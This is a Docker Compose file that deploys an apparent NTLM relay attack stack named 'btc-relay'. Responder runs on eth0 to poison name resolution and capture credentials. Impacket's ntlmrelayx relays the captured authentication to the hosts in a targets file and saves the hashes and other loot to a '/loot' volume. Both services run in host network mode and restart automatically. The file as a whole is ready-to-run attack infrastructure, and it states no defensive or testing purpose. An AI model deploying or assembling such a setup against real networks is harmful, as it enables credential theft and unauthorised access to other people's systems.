version: "3.8"

# WARNING: This compose file is provided for reference only.
# The production orchestrator uses docker-py directly and does NOT rely on compose.
# Host network mode requires Linux.

services:
  responder:
    build:
      context: ./responder
    image: btc-relay/responder:latest
    container_name: btc-relay-responder
    network_mode: host
    volumes:
      - ../logs:/opt/responder/logs
    restart: unless-stopped
    command: ["-I", "eth0", "-v", "-w", "-D"]

  ntlmrelayx:
    build:
      context: ./impacket
    image: btc-relay/impacket:latest
    container_name: btc-relay-ntlmrelayx
    network_mode: host
    volumes:
      - ../loot:/loot
      - ../logs:/logs
    restart: unless-stopped
    command: ["tail -f /dev/null | ntlmrelayx.py -tf /logs/targets.txt -ip 0.0.0.0 -smb2support --keep-relaying -of /loot/hashes -l /loot"]
